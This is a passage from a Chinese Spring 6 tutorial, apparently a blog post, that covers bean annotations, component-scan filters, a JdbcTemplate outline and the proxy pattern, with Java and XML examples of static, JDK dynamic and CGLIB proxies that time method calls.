属性名=属性值……)<br>userBean为什么使用双引号括起来，因为value属性是String类型，字符串。</p><h4 id="12-2-声明Bean的注解"><a href="#12-2-声明Bean的注解" class="headerlink" title="12.2 声明Bean的注解"></a>12.2 声明Bean的注解</h4><p>@Controller、@Service、@Repository这三个注解都是@Component注解的别名。<br>也就是说：这四个注解的功能都一样。用哪个都可以。<br>只是为了增强程序的可读性，建议：<br>●控制器类上使用：Controller<br>●service类上使用：Service<br>●dao类上使用：Repository</p><h4 id="12-3-Spring注解的使用"><a href="#12-3-Spring注解的使用" class="headerlink" title="12.3 Spring注解的使用"></a>12.3 Spring注解的使用</h4><p>如何使用以上的注解呢？<br>●第一步：加入aop的依赖<br>●第二步：在配置文件中添加context命名空间<br>●第三步：在配置文件中指定扫描的包<br>●第四步：在Bean类上使用注解</p><h4 id="12-4-选择性实例化Bean"><a href="#12-4-选择性实例化Bean" class="headerlink" title="12.4 选择性实例化Bean"></a>12.4 选择性实例化Bean</h4><p>假设在某个包下有很多Bean，有的Bean上标注了Component，有的标注了Controller，有的标注了Service，有的标注了Repository，现在由于某种特殊业务的需要，只允许其中所有的Controller参与Bean管理，其他的都不实例化。这应该怎么办呢？</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean3<span class="token punctuation">"</span></span> <span class="token attr-name">use-default-filters</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>include-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Controller<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>use-default-filters=”true” 表示：使用spring默认的规则，只要有Component、Controller、Service、Repository中的任意一个注解标注，则进行实例化。<br><strong>use-default-filters=”false”</strong> 表示：不再spring默认实例化规则，即使有Component、Controller、Service、Repository这些注解标注，也不再实例化。<br>&lt;context:include-filter type=”annotation” expression=”org.springframework.stereotype.Controller”/&gt; 表示只有Controller进行实例化。</p><p>也可以将use-default-filters设置为true（不写就是true），并且采用exclude-filter方式排出哪些注解标注的Bean不参与实例化：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>exclude-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Repository<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>exclude-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Service<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>exclude-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Controller<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span></code></pre><h4 id="12-5-负责注入的注解"><a href="#12-5-负责注入的注解" class="headerlink" title="12.5 负责注入的注解"></a>12.5 负责注入的注解</h4><p>@Component @Controller @Service @Repository 这四个注解是用来声明Bean的，声明后这些Bean将被实例化。接下来我们看一下，如何给Bean的属性赋值。给Bean属性赋值需要用到这些注解：<br>●@Value<br>●@Autowired<br>●@Qualifier<br>●@Resource</p><h4 id="12-5-1-Value"><a href="#12-5-1-Value" class="headerlink" title="12.5.1 @Value"></a>12.5.1 @Value</h4><h4 id="12-5-2-Autowired与-Qualifier"><a href="#12-5-2-Autowired与-Qualifier" class="headerlink" title="12.5.2 @Autowired与@Qualifier"></a>12.5.2 @Autowired与@Qualifier</h4><p>@Autowired注解可以用来注入非简单类型。被翻译为：自动连线的，或者自动装配。<br>单独使用@Autowired注解，默认根据类型装配。【默认是byType】</p><p>第一处：该注解可以标注在哪里？<br>    ○构造方法上<br>    ○方法上<br>    ○形参上<br>    ○属性上<br>    ○注解上<br>●第二处：该注解有一个required属性，默认值是true，表示在注入的时候要求被注入的Bean必须是存在的，如果不存在则报错。如果required属性设置为false，表示注入的Bean存在或者不存在都没关系，存在的话就注入，不存在的话，也不报错</p><p><strong>构造方法和setter</strong>方法都<strong>没有提供</strong>，经过测试，仍然可以<strong>注入成功</strong>。</p><p>●@Autowired注解可以出现在：属性上、构造方法上、构造方法的参数上、setter方法上。<br>●当带参数的构造方法只有一个，@Autowired注解可以省略。<br>●@Autowired注解默认根据类型注入。如果要根据名称注入的话，需要配合@Qualifier注解一起使用。</p><h4 id="12-5-3-Resource"><a href="#12-5-3-Resource" class="headerlink" title="12.5.3 @Resource"></a>12.5.3 @Resource</h4><p>@Resource注解也可以完成非简单类型注入。那它和@Autowired注解有什么区别？<br>●@Resource注解是JDK扩展包中的，也就是说属于JDK的一部分。所以该注解是标准注解，更加具有通用性。(JSR-250标准中制定的注解类型。JSR是Java规范提案。)<br>●@Autowired注解是Spring框架自己的。<br>●@Resource注解默认根据名称装配byName，未指定name时，使用属性名作为name。通过name找不到的话会自动启动通过类型byType装配。<br>●@Autowired注解默认根据类型装配byType，如果想根据名称装配，需要配合@Qualifier注解一起用。<br>●@Resource注解用在属性上、setter方法上。<br>●@Autowired注解用在属性上、setter方法上、构造方法上、构造方法参数上。<br>@Resource注解属于JDK扩展包，所以不在JDK当中，需要额外引入以下依赖：【如果是JDK8的话不需要额外引入依赖。高于JDK11或低于JDK8需要引入以下依赖。】</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>jakarta.annotation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jakarta.annotation-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>一定要注意：如果你用Spring6，要知道Spring6不再支持JavaEE，它支持的是JakartaEE9。（Oracle把JavaEE贡献给Apache了，Apache把JavaEE的名字改成JakartaEE了，大家之前所接触的所有的  javax.*  包名统一修改为  jakarta.*包名了。）</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.annotation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.annotation-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h4 id="12-6-全注解式开发"><a href="#12-6-全注解式开发" class="headerlink" title="12.6 全注解式开发"></a>12.6 全注解式开发</h4><pre class=" language-xml"><code class="language-xml">@Configuration@ComponentScan({"com.powernode.spring6.dao", "com.powernode.spring6.service"})public class Spring6Configuration {}</code></pre><h3 id="十三、JdbcTemplate"><a href="#十三、JdbcTemplate" class="headerlink" title="十三、JdbcTemplate"></a>十三、JdbcTemplate</h3><p>13.1 环境准备<br>13.2 新增<br>13.3 修改<br>13.4 删除<br>13.5 查询一个对象<br>13.6 查询多个对象<br>13.7 查询一个值<br>13.8 批量添加<br>13.9 批量修改<br>13.10 批量删除<br>13.11 使用回调函数<br>13.12 使用德鲁伊连接池</p><h3 id="十四、GoF之代理模式"><a href="#十四、GoF之代理模式" class="headerlink" title="十四、GoF之代理模式"></a>十四、GoF之代理模式</h3><h4 id="14-1-对代理模式的理解"><a href="#14-1-对代理模式的理解" class="headerlink" title="14.1 对代理模式的理解"></a>14.1 对代理模式的理解</h4><p>代理模式中有一个非常重要的特点：对于客户端程序来说，使用代理对象时就像在使用目标对象一样。【在程序中，目标需要被保护时】</p><p>代理模式的作用是：为其他对象提供一种代理以控制对这个对象的访问。在某些情况下，一个客户不想或者不能直接引用一个对象，此时可以通过一个称之为“代理”的第三者来实现间接引用。代理对象可以在客户端和目标对象之间起到中介的作用，并且可以通过代理对象去掉客户不应该看到的内容和服务或者添加客户需要的额外服务。 通过引入一个新的对象来实现对真实对象的操作或者将新的对象作为真实对象的一个替身，这种实现机制即为代理模式，通过引入代理对象来间接访问一个对象，这就是代理模式的模式动机。</p><p>代理模式中的角色：<br>●代理类（代理主题）<br>●目标类（真实主题）<br>●代理类和目标类的公共接口（抽象主题）：客户端在使用代理类时就像在使用目标类，不被客户端所察觉，所以代理类和目标类要有共同的行为，也就是实现共同的接口。</p><h4 id="14-2-静态代理"><a href="#14-2-静态代理" class="headerlink" title="14.2 静态代理"></a>14.2 静态代理</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderServiceProxy</span> <span class="token keyword">implements</span> <span class="token class-name">OrderService</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 代理对象</span>    <span class="token comment" spellcheck="true">// 目标对象</span>    <span class="token keyword">private</span> OrderService orderService<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 通过构造方法将目标对象传递给代理对象</span>    <span class="token keyword">public</span> <span class="token function">OrderServiceProxy</span><span class="token punctuation">(</span>OrderService orderService<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>orderService <span class="token operator">=</span> orderService<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">long</span> begin <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 执行目标对象的目标方法</span>        orderService<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> end <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"耗时"</span><span class="token operator">+</span><span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">long</span> begin <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 执行目标对象的目标方法</span>        orderService<span class="token punctuation">.</span><span class="token function">detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> end <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"耗时"</span><span class="token operator">+</span><span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">long</span> begin <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 执行目标对象的目标方法</span>        orderService<span class="token punctuation">.</span><span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> end <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"耗时"</span><span class="token operator">+</span><span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建目标对象</span>        OrderService target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 创建代理对象</span>        OrderService proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderServiceProxy</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用代理对象的代理方法</span>        proxy<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        proxy<span class="token punctuation">.</span><span class="token function">detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>以上就是代理模式中的静态代理，其中OrderService接口是代理类和目标类的共同接口。OrderServiceImpl是目标类。OrderServiceProxy是代理类。<br>大家思考一下：如果系统中业务接口很多，一个接口对应一个代理类，显然也是不合理的，会导致类爆炸。怎么解决这个问题？动态代理可以解决。因为在动态代理中可以在内存中动态的为我们生成代理类的字节码。代理类不需要我们写了。类爆炸解决了，而且代码只需要写一次，代码也会得到复用。</p><h4 id="14-3-动态代理"><a href="#14-3-动态代理" class="headerlink" title="14.3 动态代理"></a>14.3 动态代理</h4><p>在程序运行阶段，在内存中动态生成代理类，被称为动态代理，目的是为了减少代理类的数量。解决代码复用的问题。<br>在内存当中动态生成类的技术常见的包括：<br>●<strong>JDK动态代理</strong>技术：<strong>只能代理接口</strong>。<br>●<strong>CGLIB动态代理</strong>技术：CGLIB(Code Generation Library)是一个开源项目。是一个强大的，高性能，高质量的Code生成类库，它可以在运行期扩展Java类与实现Java接口。它<strong>既可以代理接口，又可以代理类</strong>，底层是通过继承的方式实现的。性能比JDK动态代理要好。（底层有一个小而快的字节码处理框架ASM。）<br>●<strong>Javassist动态代理</strong>技术：Javassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。它已加入了开放源代码JBoss 应用服务器项目，通过使用Javassist对字节码操作为JBoss实现动态”AOP”框架。</p><h4 id="14-3-1-JDK动态代理"><a href="#14-3-1-JDK动态代理" class="headerlink" title="14.3.1 JDK动态代理"></a>14.3.1 JDK动态代理</h4><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 第一步：创建目标对象</span>        OrderService target <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 第二步：创建代理对象</span>        OrderService orderServiceProxy <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TimerInvocationHandler</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 第三步：调用代理对象的代理方法</span>        orderServiceProxy<span class="token punctuation">.</span><span class="token function">detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orderServiceProxy<span class="token punctuation">.</span><span class="token function">modify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orderServiceProxy<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>Proxy类全名：java.lang.reflect.Proxy。这是JDK提供的一个类（所以称为JDK动态代理）。主要是通过这个类在内存中生成代理类的字节码。<br>其中newProxyInstance()方法有三个参数：<br>●第一个参数：类加载器。在内存中生成了字节码，要想执行这个字节码，也是需要先把这个字节码加载到内存当中的。所以要指定使用哪个类加载器加载。<br>●第二个参数：接口类型。代理类和目标类实现相同的接口，所以要通过这个参数告诉JDK动态代理生成的类要实现哪些接口。<br>●第三个参数：调用处理器。这是一个JDK动态代理规定的接口，接口全名：java.lang.reflect.InvocationHandler。显然这是一个回调接口，也就是说调用这个接口中方法的程序已经写好了，就差这个接口的实现类了。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimerInvocationHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 目标对象</span>    <span class="token keyword">private</span> Object target<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 通过构造方法来传目标对象</span>    <span class="token keyword">public</span> <span class="token function">TimerInvocationHandler</span><span class="token punctuation">(</span>Object target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>target <span class="token operator">=</span> target<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 目标执行之前增强。</span>        <span class="token keyword">long</span> begin <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用目标对象的目标方法</span>        Object retValue <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 目标执行之后增强。</span>        <span class="token keyword">long</span> end <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"耗时"</span><span class="token operator">+</span><span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 一定要记得返回哦。</span>        <span class="token keyword">return</span> retValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>InvocationHandler接口中有一个方法invoke，这个invoke方法上有三个参数：<br>●第一个参数：Object proxy。代理对象。设计这个参数只是为了后期的方便，如果想在invoke方法中使用代理对象的话，尽管通过这个参数来使用。<br>●第二个参数：Method method。目标方法。<br>●第三个参数：Object[] args。目标方法调用时要传的参数。</p><p>当你调用代理对象的代理方法的时候，注册在InvocationHandler接口中的invoke()方法会被调用。也就是orderServiceProxy.xxx()，这三行代码中任意一行代码执行，注册在InvocationHandler接口中的invoke()方法都会被调用。</p><h4 id="14-3-2-CGLIB动态代理"><a href="#14-3-2-CGLIB动态代理" class="headerlink" title="14.3.2 CGLIB动态代理"></a>14.3.2 CGLIB动态代理</h4><p>CGLIB既可以代理接口，又可以代理类。底层采用继承的方式实现。所以被代理的目标类不能使用final修饰。</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>cglib<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>cglib<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimerMethodInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">MethodInterceptor</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">intercept</span><span class="token punctuation">(</span>Object target<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> objects<span class="token punctuation">,</span> MethodProxy methodProxy<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 前增强</span>        <span class="token keyword">long</span> begin <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 调用目标</span>        Object retValue <span class="token operator">=</span> methodProxy<span class="token punctuation">.</span><span class="token function">invokeSuper</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> objects<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 后增强</span>        <span class="token keyword">long</span> end <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"耗时"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> begin<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"毫秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 一定要返回</span>        <span class="token keyword">return</span> retValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//第一个参数：目标对象</span><span class="token comment" spellcheck="true">//第二个参数：目标方法</span><span class="token comment" spellcheck="true">//第三个参数：目标方法调用时的实参</span><span class="token comment" spellcheck="true">//第四个参数：代理方法</span></code></pre><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建字节码增强器</span>        Enhancer enhancer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Enhancer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 告诉cglib要继承哪个类</span>        enhancer<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>UserService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置回调接口</span>        enhancer<span class="token punctuation">.</span><span class="token function">setCallback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TimerMethodInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 生成源码，编译class，加载到JVM，并创建代理对象</span>        UserService userServiceProxy <span class="token operator">=</span> <span class="token punctuation">(</span>UserService<span class="token punctuation">)</span>enhancer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userServiceProxy<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 